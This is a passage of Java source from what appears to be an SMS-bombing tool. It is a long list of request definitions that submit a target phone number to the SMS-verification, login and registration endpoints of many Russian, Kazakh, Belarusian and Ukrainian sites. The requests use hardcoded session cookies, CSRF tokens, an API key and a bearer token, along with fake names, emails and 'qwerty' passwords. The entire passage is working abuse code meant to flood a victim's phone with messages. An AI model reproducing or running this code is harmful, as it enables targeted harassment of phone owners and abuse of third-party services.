                    request.header("Cookie", "_csrf=8582d9183ea0f6a17304125414be4795f198a69237317e3adf77463c93c2dc42a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220bBJbi4bJgsHJ3_s2QkIYgUF5AGdKw8H%22%3B%7D; app_history=%5B%22https%3A%2F%2Fbankiros.ru%2F%22%5D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20Edg%2F103.0.1264.77; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbankiros.ru%2F; city-tooltip=1; prod=5posuk9of5hcopttjj6bnfe8g2; _gcl_au=1.1.1996142512.1659883651; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ga_session_id=4ce074bd-0b40-4664-8231-10c73438fc06; _gid=GA1.2.151715844.1659883653; _ga_5D863YT644=GS1.1.1659883653.1.0.1659883653.0; tmr_lvid=7e50cf8f2108a9fb1e34da6702768225; tmr_lvidTS=1659883653264; tmr_detect=0%7C1659883655576; _ga=GA1.2.316605841.1659883653; _ym_uid=1659883656667247307; _ym_d=1659883656; _ym_visorc=b; _ym_isad=2; tmr_reqNum=3; cookies-tooltip=223025677b0f227a6dd1c3820a99553a6d485d2246bf8dbc1879a5982ec9a863a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22cookies-tooltip%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D");
                    request.header("x-csrf-token", "LcaB1fFLqRU-B791Zfir3HeB2tSxeA2vSWNTxHXxy9QdpMOfkyKdd3RgzD0vy_SvRdCxnegfWOl8IhSgPobznA==");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.addQueryParameter("action", "sendSms");
                    builder.addQueryParameter("phone", phone.toString());
                    builder.addQueryParameter("userIdentityId", "91445499");
                    builder.addQueryParameter("ga", "GA1.2.316605841.1659883653");
                }
            },

            new JsonService("https://adengi.ru/rest/v1/registration/code/send", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; __cfruid=5e7708e2f80d72738db410be7aee4e588e853f7c-1659885549; _ga=GA1.2.348103934.1659885585; _gid=GA1.2.2043862512.1659885585; tmr_lvid=e462f5f07dce35b045f464b2f70b516e; tmr_lvidTS=1656429758785; _ym_uid=1656429759333836542; _ym_d=1659885586; _ym_visorc=b; _ym_isad=2; tmr_detect=0%7C1659885587521; supportOnlineTalkID=GwJBk17SVDMh9IVIpEnrbvZdNdxdL86o; ec_id=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; tmr_reqNum=11");
                    request.header("x-device-uid", "14b4ccbc-9f0c-460e-b756-9edcf8cd68d2");
                    request.header("x-version-fe", "1659504023660");

                    try {
                        return new JSONObject()
                                .put("email", getEmail())
                                .put("firstName", getRussianName())
                                .put("lastName", getRussianName())
                                .put("middleName", getRussianName())
                                .put("phone", phone.toString())
                                .put("via", "sms")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://ovenpizza.ru/wp-content/themes/twentynineteen/inc/func.php")
                            .post(RequestBody.create("------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                    "Content-Disposition: form-data; name=\"flag\"\n" +
                                    "\n" +
                                    "check_login\n" +
                                    "------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                    "Content-Disposition: form-data; name=\"tel\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** **-**") +
                                    "\n------WebKitFormBoundaryZqudgny7DXMMKMxU--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZqudgny7DXMMKMxU")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://lord-craft.ru/user_account/ajax.php?do=sms_code", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "8(***)***-**-**"));
                }
            },

            new FormService("https://chocofood.kz/gateway/user/v2/code/", 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("client_id", "11619734");
                    builder.add("login", phone.toString());
                }
            },

            new JsonService("https://sso.mycar.kz/auth/login/", 77) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("phone_number", "+" + phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://arbuz.kz/api/v1/user/verification/phone", 77) {
                @Override
                public void buildParams(Phone phone) {
                    request.header("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjZjODk1NS0wMzgzLTRiM2QtYTJjNy0wZDQ2N2NlYzVhZWQiLCJpc3MiOiJRaEZTNW5vMmJqQzQ3djVRNEU3N0FBMnh3V1BFdUJ1biIsImlhdCI6MTY1OTg5MTQ3MCwiZXhwIjo0ODEzNDkxNDcwLCJjb25zdW1lciI6eyJpZCI6ImU1YzRlYTA1LWY4ZTgtNDJiZC1iMDJhLWNmMzNlODAyZjA5NiIsIm5hbWUiOiJhcmJ1ei1rei53ZWIuZGVza3RvcCJ9LCJjaWQiOm51bGx9.ebpJLdB-FOfb1IsAVbW-dECSoKwQc5tsnhhYKZ_FeM4");

                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new JsonService("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Accept", "application/json, text/javascript, */*; q=0.01");
                    request.header("Accept-Encoding", "gzip, deflate, br");
                    request.header("Accept-Language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("Connection", "keep-alive");
                    request.header("Content-Length", "24");
                    request.header("Content-Type", "application/json");
                    request.header("Cookie", "geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; mobile=false; device=pc; _ga=GA1.2.823290515.1656377291; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; _ym_uid=16563772911015405951; _ym_d=1656377291; __zzat129=MDA0dBA=Fz2+aQ==; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; cfids129=; APPLICATION_CONTEXT_CITY=21; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F102.0.5005.115%20Safari%2F537.36%20OPR%2F88.0.4412.75; _gid=GA1.2.229297435.1657385025; _ym_isad=1; _ym_visorc=b; geo_detect_coords=55.796539%2C49.1082; geo_detect_url=kazan; geo_detect=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C%2C%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%20%D0%A2%D0%B0%D1%82%D0%B0%D1%80%D1%81%D1%82%D0%B0%D0%BD%2C%D0%9F%D1%80%D0%B8%D0%B2%D0%BE%D0%BB%D0%B6%D1%81%D0%BA%D0%B8%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; _gat=1; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form");
                    request.header("DNT", "1");
                    request.header("Host", "oapi.raiffeisen.ru");
                    request.header("Origin", "https://www.raiffeisen.ru");
                    request.header("Referer", "https://www.raiffeisen.ru/retail/cards/debit/cashback-card/");
                    request.header("Sec-Fetch-Dest", "empty");
                    request.header("Sec-Fetch-Mode", "cors");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("Sec-Fetch-Site", "same-site");

                    try {
                        return new JSONObject()
                                .put("number", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://vkusvill.ru/ajax/user_v2/auth/check_phone.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=JFDE2S1WINIRUlqa6WMH4wIGsbN4V6ui; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix01; _vv_card=A402373; _gcl_au=1.1.1619096383.1661248403; _ym_uid=1661248404718516519; _ym_d=1661248404; tmr_lvid=4b0376f50a09ccffe9ca93755ced8567; tmr_lvidTS=1661248403869; _ga=GA1.2.395200366.1661248404; _gid=GA1.2.1193627669.1661248404; _gat_gtag_UA_138047372_1=1; _ym_isad=2; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=FHHjvoNFQne7JHtHv2Uo; mgo_cnt=1; mgo_sid=pk4lrh2bh011001q8wnp; _dc_gtm_UA-138047372-1=1; uxs_uid=6d9a40f0-22c9-11ed-a82b-25c841ac1c5b; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; tmr_detect=0%7C1661248406244; WE_USE_COOKIE=Y; tmr_reqNum=8");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("FUSER_ID", "207529943");
                    builder.add("USER_NAME", "");
                    builder.add("USER_PHONE", format(phone.getPhone(), "+7 (***) ***-****"));
                    builder.add("token", "");
                    builder.add("is_retry", "");
                    builder.add("AGREE_SUBSCRIBE", "Y");
                }
            },

            new FormService("https://www.liqpay.ua/apiweb/login/start", 380) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "_gcl_au=1.1.2000038126.1661250974; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F104.0.5112.102%20Safari%2F537.36%20Edg%2F104.0.1293.63; _ga_SC8SJ5GD85=GS1.1.1661250974.1.0.1661250974.0.0.0; _fbp=fb.1.1661250974723.798111670; _ga=GA1.2.804869749.1661250975; _gid=GA1.2.1515868995.1661250975; _dc_gtm_UA-213775397-1=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fuk%2Flogin%2Flogin%2F1661250975005613_69027_PhMFILQwTvgiZrnm8B7X; _dc_gtm_UA-48226031-1=1");
                    request.header("-requested-with", "XMLHttpRequest");

                    builder.add("token", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("phone", phone.toString());
                    builder.add("pagetoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("checkouttoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("language", "uk");
                }
            },

            new FormService("https://aptechestvo.ru/ajax/new_app/sms/send_sms_code.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7(***) ***-**-**"));
                }
            },

            new JsonService("https://green-dostavka.by/api/v1/auth/request-confirm-code/", 375) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "tmr_lvid=0967463045c6bc62af3d493d4e61a7f6; tmr_lvidTS=1664384202297; _ga=GA1.2.618762003.1664384202; _gid=GA1.2.2070330642.1664384203; _dc_gtm_UA-175994570-1=1; _gat_UA-231562053-1=1; _ym_uid=1664384203181017640; _ym_d=1664384203; _ym_isad=2; _ym_visorc=w; _ga_0KMPZ479SN=GS1.1.1664384202.1.1.1664384204.58.0.0; tmr_detect=0|1664384205010; tmr_reqNum=6");

                    try {
                        return new JSONObject()
                                .put("phoneNumber", format(phone.getPhone(), "+375 ** *** ** **"))
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://sosedi.by/local/api/smsSend.php", 375) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "_gcl_au=1.1.440078486.1664384002; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ym_uid=1664384005288308463; _ym_d=1664384005; _ga=GA1.2.1716162404.1664384005; _gid=GA1.2.256273649.1664384005; tmr_lvid=6015526cad4b89db479519786a667a37; tmr_lvidTS=1664384004982; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; PHPSESSID=zlqD9vpWcOSVOhtY5iv9rjySBYog0QQk; _gat_gtag_UA_34496864_1=1; _ym_visorc=w; _ym_isad=2; tmr_detect=0|1664468829484; tmr_reqNum=12; cookiepolicyaccept=true");

                    try {
                        return new JSONObject()
                                .put("phone", format(phone.getPhone(), "+375 (**) *******"))
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://www.respect-shoes.kz/send_sms", 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("_token", "K0uMK3EpgqiMLt1pXeqsPoQxtnPZBWen98Sm41bH");
                    builder.add("tel", format(phone.getPhone(), "+7 (7**) ***-**-**"));

                    request.header("cookie", "_gcl_au=1.1.1523339745.1664471567; tmr_lvid=5cfff78042fa8318f8edede4e2f1780d; tmr_lvidTS=1659695387764; _gid=GA1.2.759847769.1664471567; _ym_uid=1659695389109290314; _ym_d=1664471567; roistat_visit=1941526; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=3fc27b9b-4797-4657-8bc9-b00a346625d6; ___dc=61a72ed9-acc4-44f9-ac7d-1fd9e1ea2ae8; Cookie_id=eyJpdiI6Imdpc216aGlUT1cwS1BaVVwvSXQ1OGZnPT0iLCJ2YWx1ZSI6IlpFMlJKWEFzOVwvbEVWejRYTm11d1JXZ2VQVTZZNk5kUjhSXC83R2tEMkpHMU52bDdXY1cxdVZrZ3JuWitMa0M5ciIsIm1hYyI6IjAzMTAwOTE1M2JiODZiZmU5YzJkZTkyNTVhOGRkODcxMzI1MDlhNDYyOGU3YzQ0YTIyNGUzOTBmMmViOTkyODgifQ==; siti_id=eyJpdiI6IlY1Vk1vTFBpUlwvRkp0c252QkFVMklnPT0iLCJ2YWx1ZSI6IkdkSnl0elk2NGF5SmNWWjhPdWxyZHc9PSIsIm1hYyI6Ijg2Y2E2NDhkZThlMDMzZDRmNzBhNDk2Mzg5YTk3OTkyNTZiNmNmOTAwZTc3MjZlZGIwODgwNjgwN2QwNmRiMjQifQ==; sitiset=eyJpdiI6InlWaUxXQjcxcGpPWUQrV3dBeXpWXC9nPT0iLCJ2YWx1ZSI6IkZiVXZmM2NGR0N0TUVMT2hyRWdZT2c9PSIsIm1hYyI6IjMyODM2YmRiMThlYzRmZDhhNjdkZGYxOTE2M2I3ZTIwNmQ2ZWZhOWQxOTQ1ZGZiMWRlODAzZDU3NjA2ZjAwYzcifQ==; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=null; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; _ga=GA1.2.111816835.1664471567; tmr_detect=0|1664471755330; tmr_reqNum=14; 499818=eyJpdiI6InNxWkp6M05Tajl4SlZXb2t5R1wvNFVnPT0iLCJ2YWx1ZSI6Im0xb3poMUJHclpSZFA3TnhqWXp3RVlrRFwvSUNBaVNRdXRPRmtjWGJ0M3Y2RzUrM052OG9YWE9yMnFMVExyK2cwWUNzOHFtb1wvd0E3c0JFemNmc0J1Rmc9PSIsIm1hYyI6IjRkMTdkZDVjZjY1ZmFjNWE0OWJjNGNiOGEwMGNiM2UyMzY1ZDQ2ZjIxM2Y4NTQ1NmVkYmMwNDQ2NTQ4ZmM3MjIifQ==; _ga_NFEYSRQ86N=GS1.1.1664471566.1.1.1664471942.0.0.0; XSRF-TOKEN=eyJpdiI6Ikt3MjZrY0NPQkpSZlNkY0J1ckpuSGc9PSIsInZhbHVlIjoia1BGNTFITnB3Z3ZlaFYrMzhoZWlIVmp6dHFcL0JvSjZST280bnJpRm9XejdBa2d6cjByODN3RTdoZE9NdG84blciLCJtYWMiOiIwMmE0OTkxNGRjMzc4OWYxZWIzMmNlNzRkYWMzZDVhNjI4ZDQ1NmVmMmRjN2Y5MTU1NzRiNGFkMzliODBmNDlmIn0=; laravel_session=eyJpdiI6IlwvRGpJdkVIY3RHdTlhRDRINWt6czRnPT0iLCJ2YWx1ZSI6ImFhaFVOWXpXdGRVVE1vWjRQXC9PNEQwaWEwaXFQaGNCZUhyemVncWp5YlI4VERxeFwvY3RicDFMWW9vNDVWcmFrZiIsIm1hYyI6IjA1MmNlNzM1NzNhNzc2OTg2MGFiMDQzZTY2ZmMxOGIyOTlhNzFiNTkwNjU3NDYyYzQ3MTYyMjkyODdlMTM2NzkifQ==; 768131=eyJpdiI6IkQ0cGlZcVUzNXNxUXNPaTNjNEcwRnc9PSIsInZhbHVlIjoiUk5URkR1Y05Vclc1Y01qbE5aUzJCZkdtMmp1Qll5WlNNeXNpeDV2MzVDYmtUcUZrT1wvcUVlaU1ianQraU41RTU1NWVEZVNGMkNCaVZuREN6U2ppV29BPT0iLCJtYWMiOiJkOThjNGE5ZTQwNGQxNjAwMWI0YmI2NmRiZjk1OTExNTNhOWI4YzcwNGE0N2IzNDcyNDRmNzBhMmIyNmFmYTM5In0=; tel=eyJpdiI6IlhLa2ExTVJsc3plZ1c4cEFiRGFIM1E9PSIsInZhbHVlIjoiZDB2MFpiMERqZTMxTzdBUkRVb0dSUT09IiwibWFjIjoiMjliZDdiZWQxYzNiYzkwZTM2MjJjNGNiY2ZmODY5MzQxYzE0MWEzODgzYWYyNTM5Mzg5YjYxNzJkMmQ4MzU1YSJ9");
                    request.header("X-Requested-With", "XMLHttpRequest");
                }
            },

            new FormService("https://id.kolesa.kz/getInfoAuth.json", 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("project", "market");
                    builder.add("login", "+" + phone.toString());
                    builder.add("csrf", "czhDbUhLR1E5YUh1dHllZ0ZOdlU0UT09");
                    builder.add("restore", "0");
                    builder.add("iteration", "primary");

                    request.header("cookie", "ccid=vur2iajjpti6u660kdkii4mlgd; ssaid=e020e420-401b-11ed-b971-fb3d2d634bd2; __tld__=null");
                    request.header("X-Requested-With", "XMLHttpRequest");
                }
            },

            new FormService("https://api.yarus.ru/reg", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("x-api-key", "PELQTQN2mWfml8XVYsJwaB9Qi4t8XE");
                    request.header("x-app", "3");
                    request.header("x-device-id", "ID-1664626775947");

                    builder.add("phone", format(phone.getPhone(), "+7(***) ***-****"));
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    String formattedPhone = format(phone.getPhone(), "+7 (***) ***-**-**");

                    client.newCall(new Request.Builder()
                            .url("https://babylonvape.ru/auth/registration/?register=yes&backurl=%2Fauth%2F")
                            .header("upgrade-insecure-requests", "1")
                            .header("referer", "https://babylonvape.ru/auth/registration/?register=yes&backurl=/auth/")
                            .header("cookie", "PHPSESSID=9D26aEZS5EpjZlhsd1Y1NYWyAufAzpwp; BITRIX_SM_SALE_UID=c29417494cd049f7c5fcf28051ace9d2; rrpvid=780283164294524; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":5,\"EXPIRE\":1664657940,\"UNIQUE\":[\"conversion_visit_day\"]}; _ym_debug=null; _ym_uid=1654436025122788696; _ym_d=1664632221; rcuid=6275fcd65368be000135cd22; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.877344353.1664632222; _gid=GA1.2.958698788.1664632222; rrwpswu=true; babylon_confirm_age=Y; _gat_gtag_UA_56968396_1=1")
                            .post(RequestBody.create("------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"backurl\"\n" +
                                            "\n" +
                                            "/auth/\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"register_submit_button\"\n" +
                                            "\n" +
                                            "reg\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[LOGIN]\"\n" +
                                            "\n" +
                                            "1\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[LAST_NAME]\"\n" +
                                            "\n" +
                                            "\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[NAME]\"\n" +
                                            "\n" +
                                            "\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[SECOND_NAME]\"\n" +
                                            "\n" +
                                            "\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[EMAIL]\"\n" +
                                            "\n" +
                                            getEmail() +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PERSONAL_PHONE]\"\n" +
                                            "\n" +
                                            formattedPhone +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PASSWORD]\"\n" +
                                            "\n" +
                                            "qwerty\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[CONFIRM_PASSWORD]\"\n" +
                                            "\n" +
                                            "qwerty\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"licenses_register\"\n" +
                                            "\n" +
                                            "Y\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                            "\n" +
                                            formattedPhone +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                            "\n" +
                                            formattedPhone +
                                            "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                            "Content-Disposition: form-data; name=\"register_submit_button1\"\n" +
                                            "\n" +
                                            "Регистрация\n" +
                                            "------WebKitFormBoundaryZKfaTYUmRp781EJr--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZKfaTYUmRp781EJr")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://www.moyo.ua/identity/registration", 380) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("x-requested-with", "XMLHttpRequest");
                    request.header("cookie", "YII_CSRF_TOKEN=b5600a221539c29fd3628b4d0e682b65e8e51355; _hjSessionUser_1850514=eyJpZCI6ImY3MWQ2M2NhLTFmNjUtNTY5MC1hMDE4LTZjMzc1ZTM3NDk3MCIsImNyZWF0ZWQiOjE2NjUxNTMwMDY2NTEsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_1850514=eyJpZCI6IjgwZmI0YzgwLWI0YWUtNDgxNC04NGE2LTk0YmVkODQ0NjM0ZiIsImNyZWF0ZWQiOjE2NjUxNTMwMDg2MzYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; new_user_ga=1; no_detected_user_ga=0; PHPSESSID=fdeiilohmvd7o6t1lm1ghhmm66; g_state={\"i_p\":1665160212060,\"i_l\":1}");

                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone.getPhone(), "+380(**)***-**-**"));
                    builder.add("email", getEmail());
                }
            },

            new JsonService("https://sushiwok.ua/user/phone/validate", 380) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("x-csrf-token", "Igss6bSK-lyXx8LjfYBek-CyeNNNXHwMgY_w");
                    request.header("x-requested-with", "XMLHttpRequest");
